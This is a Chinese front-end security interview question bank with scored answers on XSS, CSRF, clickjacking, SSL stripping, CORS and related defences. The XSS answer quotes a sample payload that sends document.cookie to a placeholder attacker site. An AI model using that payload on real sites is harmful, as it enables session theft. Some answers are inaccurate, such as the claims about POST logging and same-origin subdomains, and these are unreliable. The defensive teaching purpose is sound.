# 前端安全

## XSS 攻击

#### 类型：`基础`

#### 级别：`W3`、`W4`、`W5`、`W6`

#### 解答（3 分）

- **:1** XSS（Cross Site Scripting，跨站脚本），即攻击者往 Web 页面里嵌入恶意的客户端脚本，当用户浏览此网页时，脚本就会在用户的浏览器上执行，进而达到攻击者的目的。【获取用户的 Cookie、导航到恶意网站、携带木马】
- **:2** 防御：  

 >1、对输入和 URL 参数进行过滤，过滤掉会导致脚本执行的相关内容。  
 >2、对动态输出到页面的内容进行 html 编码，使脚本无法在浏览器中执行。

## CSRF 攻击

#### 类型：`基础`

#### 级别：`W3`、`W4`、`W5`、`W6`

#### 解答（5 分）

- **:1** CSRF（Cross Site Request Forgery，跨站请求伪造），即在别的站点伪造了一个请求，在受害者访问一个网站时，其 cookie 还没有过期的情况下，攻击者伪造一个链接地址发送受害者并欺骗让其点击，从而形成 CSRF 攻击。
- **:4** 防御：  

 >1、验证 HTTP 的 Referer 字段。  
 >2、在请求地址中添加 token 并验证。  
 >3、在 HTTP 头中自定义属性并验证。  
 >4、涉及到数据修改操作严格使用 post 请求而不是 get 请求。  
 >>get 的 URL 会被放在浏览器历史和 WEB 服务器日志里面，如果把关键数据放在 get 里面，被人偷窥了浏览器，会造成数据泄露。而 post 日志没有记录，也不会保留 URL，只要数据库服务器不被入侵，基本还是安全的。

## iframe 风险

#### 类型：`基础`

#### 级别：`W3`、`W4`、`W5`、`W6`

#### 解答（2 分）

- **:1** 前端页面需要用到第三方提供的页面组件，通常会以 iframe 的方式引入，比如广告插件等。这些第三方提供的插件可以运行 js 脚本、flash 插件等，破坏用户体验。
- **:1** 防御：  

 >iframe 中有一个叫做 sandbox 的安全属性，通过它可以对 iframe 的行为进行各种限制，充分实现“最小权限”原则。  

## 点击劫持

#### 类型：`基础`

#### 级别：`W3`、`W4`、`W5`、`W6`

#### 解答（6 分）

- **:1** 通过 iframe 使用别人提供的内容时，自己的页面也可能正在被不法分子放到他们精心构造的 iframe 中，进行点击劫持攻击。这是一种欺骗性强、用户参与高的攻击。
- **:2** 通常的攻击步骤是这样的：  

 >1、攻击者构造一个诱导用户点击的内容，比如页面小游戏。  
 >2、将我们的页面放入到 iframe 当中。  
 >3、利用 z-index 等 CSS 样式将这个 iframe 叠加到小游戏的垂直方向的正上方。  
 >4、把 iframe 设置为100%透明度。  
 >5、受害者访问到这个页面后，肉眼看到的是一个小游戏，如果受到诱导进行了点击的话，实际上点击到的却是 iframe 中的我们自己的页面。

- **:1** 危害：  

 >攻击者利用了受害者的用户身份，在其不知情的情况下进行一些操作。如果是删除某个重要文件记录，或者窃取敏感信息，那么造成的危害就难以承受。

- **:2** 防御：

 >1、使用 X-Frame-Options：DENY 这个 HTTP Header 来明确的告知浏览器，不要把当前HTTP响应中的内容在HTML Frame 中显示出来。
 >2、判断当前页面是否被嵌入到 iframe 中。

## 第三方依赖包带来的问题

#### 类型：`基础`

#### 级别：`W3`、`W4`、`W5`、`W6`

#### 解答（2 分）

- **:1** 现在绝大多数的开发都是在借助开发框架和各种类库进行快速开发。这样做虽然方便快速，但是与此同时也存在安全风险，如果这些来自第三方的代码有安全漏洞，那么对应用整体的安全性依然会造成严峻的挑战。
比如 Node.js 有一些已知的安全漏洞，比如 CVE-2017-11499，可能导致前端应用受到 DoS 攻击。

- **:1** 防御：  

 >使用 NSP(Node Security Platform)、Snyk 等等这类工具。

## https 存在的风险

#### 类型：`基础`

#### 级别：`W3`、`W4`、`W5`、`W6`

#### 解答（4 分）

- **:1** 即使是服务器端开启了 https，也还是存在安全隐患，黑客可以利用 SSL Stripping 这种攻击手段，强制让 https 降级回 http，从而继续进行中间人攻击。
- **:2** 过程:  

 >1、用户在浏览器里输入 URL 的时候往往不是从 https:// 开始的，而是直接从域名开始输入；  
 >2、随后浏览器向服务器发起 http 通信;  
 >3、攻击者把服务器端返回的跳转到 https 页面的响应拦截了，并且代替客户端和服务器端进行后续的通信。  

- **:1** 防御：  

 >使用 HSTS（HTTP Strict Transport Security），通过 HTTP Header 以及一个预加载的清单，来告知浏览器在和网站进行通信的时候强制性使用 HTTPS，而不是通过明文的HTTP进行通信。
 并且当遇到证书或者链接不安全的时候，则首先警告用户，并且不再让用户继续进行不安全的通信。

## 什么是跨站脚本攻击（XSS）？如何防范？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（9 分）

<details>

- **2：** 跨站脚本攻击（XSS）是一种常见的网络安全漏洞。它允许攻击者将恶意脚本（通常是 JavaScript，但也可以是其他客户端脚本语言，如 VBScript）注
入到目标网站中。这些恶意脚本在用户的浏览器中执行，因为浏览器会把它当作正常的脚本代码来解析。例如：
一个存在 XSS 漏洞的网站有一个评论功能。攻击者在评论框中输入一段包含恶意 JavaScript 代码的评论，如
`<script>document.location = 'http://malicious - site.com?cookie=' + document.cookie</script>`。当其他用户访问包含这条评论
的页面时，他们的浏览器会执行这段脚本。这段脚本会获取用户的浏览器 cookie 信息（其中可能包含用户的登录凭证等敏感信息），并将其发送到攻击者指定的恶意
网站`（http://malicious - site.com）`。

- **1：** 输入验证和过滤：<br/>
&emsp;对用户输入进行严格验证：在接收用户输入的地方（如表单提交、URL 参数等），要验证输入的内容是否符合预期的格式。例如，如果是一个只允许输入数字的字段，要检查输入是否真的是数字。
&emsp;过滤特殊字符：对于可能包含脚本代码的字符进行过滤。例如，对<、>、&、"、'等 HTML 特殊字符进行转义。在 JavaScript 中，可以使用encodeURIComponent()函数对用户输入的 URL
 参数进行编码，在服务器端也可以使用相应的函数来处理。例如在 PHP 中，使用htmlspecialchars()函数来转义 HTML 中的特殊字符，这样可以防止用户输入的内容被当作 HTML 标签或脚本解析。
- **2：** 输出编码：<br/>
&emsp;根据输出上下文进行编码：当把用户输入的数据输出到 HTML 页面时，要根据输出的位置进行合适的编码。如果是输出到 HTML 标签内部的文本内容，应该使
用 HTML 实体编码。例如，`将<转义为&lt;，>转义为&gt;`。如果是输出到 JavaScript 代码中的变量，要使用 JavaScript 编码，如对引号等进行转义，以防止代码注入。
- **2：** 内容安全策略（CSP）：<br/>
&emsp;设置策略限制脚本来源：CSP 是一种浏览器安全机制，它允许网站所有者定义哪些来源的脚本可以在页面上执行。例如，可以在服务器的响应头中设
置`Content-Security-Policy: default- src'self'; script-src'self' https://trusted-scripts.com`。这意味着默认情况下，只允许来自当前网
站（self）的资源加载，而脚本可以来自当前网站和`https://trusted - scripts.com`。这样可以防止外部恶意脚本的注入。<br/>
&emsp;阻止内联脚本和 eval () 函数的滥用：CSP 还可以设置script-src指令为'nonce-value'或'hash-value'来限制内联脚本的执行。内联脚本是直接写在
HTML 标签中的脚本，如`<script>alert('XSS');</script>`，这种形式的脚本容易被攻击者利用。同时，限制eval()函数的使用，因为eval()可以动态地执行字符串形式的 JavaScript 代码，
攻击者可能会利用它来执行恶意代码。
- **2：** 使用安全的库和框架：利用内置的安全机制，许多现代的前端框架（如 React、Vue.js）都有内置的安全机制来防止 XSS。例如，React 会自动对输出到 DOM 中的内容进行转义，除非你使用dangerouslySetInnerHTML属性（这种情况下开发者需要自己确保内容是安全的）。Vue.js 也有类似的机制，在使用插值表达式`（{{}}）`时会对内容进行 HTML 转义，防止脚本注入。

</details>

## 前端如何防止点击劫持？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（2 分）

- **2：** 可以使用 X-Frame-Options 响应头来限制页面能否被嵌套在 iframe 中，例如设置为 DENY 禁止任何页面嵌套，或者 SAMEORIGIN 只允许同源页面嵌套。

## 在前端如何安全地处理用户密码？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（3 分）

- **1：** 不要明文存储：前端绝对不能以明文形式存储用户密码。在密码输入框应使用input type="password"来隐藏用户输入。
- **1：** 传输加密：在将密码发送到后端时，应确保使用 HTTPS 协议进行加密传输，防止密码在网络传输过程中被窃取。
- **1：** 避免本地缓存：设置表单元素的autocomplete="off"，防止浏览器缓存密码。

## 假设你有一个使用 JavaScript 实现的表单提交功能，如何防止表单数据在提交过程中被篡改？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（3 分）

- **1：** 数据加密：在前端对表单数据进行加密处理后再提交，后端接收数据后再进行解密。例如，可以使用如 AES 等加密算法，确保数据在传输过程中的完整性。
- **1：** 添加数字签名：使用非对称加密算法（如 RSA）对表单数据生成数字签名。在后端接收到数据后，验证数字签名的有效性。如果签名验证通过，说明数据
在传输过程中没有被篡改。
- **1：** 使用 HTTPS：通过使用 HTTPS 协议提交表单，防止数据在网络传输过程中被中间人篡改。

## 什么是同源策略，它如何影响前端安全？

#### 类型：`基础`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（2 分）

- **1：** 同源策略：同源策略是浏览器的一种安全机制，它规定一个源（包括协议、域名、端口）的脚本只能访问同来源的资源。
- **1：** 对前端安全的影响：它防止恶意网站窃取用户在其他网站的敏感数据，保障了用户在浏览网页时的信息安全。

## 同源策略相关的安全机制有哪些

#### 类型：`拓展`

#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`

#### 解答（6 分）

<details>

- **1：** 跨域资源共享（CORS - Cross-Origin Resource Sharing）:<br/>
&emsp;原理：CORS 是一种基于 HTTP 头的机制，它允许服务器明确指定哪些源（协议、域名、端口的组合）可以访问其资源。当浏览器发起跨域请求时，会自动在请求中
添加一个 Origin 头，表明请求来自哪个源。服务器收到请求后，会根据自身配置的 CORS 规则，通过在响应头中添加相应的字段来决定是否允许该跨域请求。<br/>
&emsp;示例：假设前端页面的源是 `https://example.com`（协议为 https，域名是 example.com），要向 `https://api.example.com`（另一个同源但不同子域名
的服务器）发起获取数据的 AJAX 请求（比如使用 fetch API）。在服务器端`（https://api.example.com）`如果要允许来自 `https://example.com` 的跨域请求，可以
配置响应头如下
```js
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST, OPTIONS
Access-Control-Allow-Headers: Content-Type
//这意味着服务器允许 https://example.com 这个源使用 GET、POST 等指定的请求方法，并且允许带有 Content-Type 头的请求，浏览器看到这样的响应头后，就会
//知道这个跨域请求是被允许的，进而正常处理返回的数据。
```
- **2：** 跨文档消息传递（Cross-Document Messaging）:<br/>
&emsp;原理：不同源的文档之间想要安全通信时，可以使用 postMessage 方法。通过这个方法，一个窗口（可以是 iframe 嵌入的页面、新打开的窗口等）可以向另一个不同
源的窗口发送消息，接收方通过监听 message 事件来获取并处理收到的消息。在发送消息时，可以指定目标窗口的源（targetOrigin 参数），这样可以确保消息只会发送到期
望的源对应的窗口，避免信息泄露给其他不相关的窗口。<br/>
&emsp;示例：在页面 `https://parent.com` 中有一个 iframe 加载了 `https://child.com` 的页面。在 `https://parent.com` 页面的脚本中，可以这样
向 iframe 中的页面发送消息:
```js
const iframe = document.getElementById('myIframe');
iframe.contentWindow.postMessage('这是一条消息', 'https://child.com');
```
<br/>
&emsp;在 `https://child.com` 页面中监听 message 事件来接收处理消息:

```js
window.addEventListener('message', function(event) {
    if (event.origin === 'https://parent.com') {
        console.log('收到来自父页面的消息：', event.data);
        // 可以在这里根据消息内容进行相应操作
    }
});
```
- **1：** JSONP（虽然存在安全隐患，但曾是一种跨域手段）:<br/>
&emsp;原理：JSONP 利用了 `<script>` 标签不受同源策略限制的特点来实现跨域获取数据。它要求服务器返回的数据包裹在一个函数调用中，前端事先定义好这个函数。当浏
览器加载包含该函数调用形式数据的 `<script>` 标签时，就会执行这个函数从而获取到数据。<br/>
&emsp;示例：前端页面需要从 `https://api.example.com` 获取数据，在页面中可以这样写：
```js
function handleData(data) {
    console.log('获取到的数据：', data);
}
<script src="https://api.example.com/getData?callback=handleData"></script>
//服务器端（https://api.example.com）接收到请求后，会将数据按照约定格式返回，例如返回类似 handleData({ "name": "张三", "age": 20 }) 的内容，浏览
// 器加载这个 <script> 时就会执行 handleData 函数并传入数据。不过，JSONP 的缺点是它没有对返回的数据做安全验证，容易遭受 XSS 攻击，所以现在正规场景下使用
// 较少，多被 CORS 等更安全的机制替代。
```
- **2：** 同源策略下的 Cookie 限制:<br/>
&emsp;原理：默认情况下，浏览器发送 Cookie 遵循同源策略，只有当请求的目标 URL 与 Cookie 所属的域同源时，浏览器才会自动在请求头中带上对应的 Cookie。但在
一些跨域场景中，比如子域名之间共享 Cookie，可以通过设置 Domain 属性来指定允许共享的域名范围（要遵循一定规则，比如不能设置为顶级域名之外的其他域等），还可以通过
设置 SameSite 属性来控制 Cookie 在跨站请求时的发送行为，SameSite 有 Strict、Lax、None 等取值，Strict 模式下只有同站点请求才会发送 Cookie，Lax 模式在一
些安全的跨站导航请求时会有条件发送 Cookie，None 模式（通常需要配合 Secure 属性在 HTTPS 下使用）相对宽松些允许跨站发送 Cookie 但安全性依赖于 HTTPS 加密。<br/>
&emsp;示例：在服务器端设置 Cookie 时（假设使用 Node.js 的 http 模块简单示例）：

```js
http.createServer((req, res) => {
    res.writeHead(200, {
        'Set-Cookie': 'myCookie=value; Domain=.example.com; SameSite=Lax; Path=/'
    });
    res.end('Cookie已设置');
}).listen(3000);
//这样设置后，在符合 Lax 模式规则的跨子域名请求等场景下，Cookie 有可能会被发送，实现了在同源策略框架下一定程度的跨域相关 Cookie 管理和共享控制。
//这些安全机制在遵循同源策略的基础上，通过不同的方式来实现合理的跨域交互或者加强对跨域场景下信息交互的安全管控，保障 Web 应用的整体安全性。
```
</details>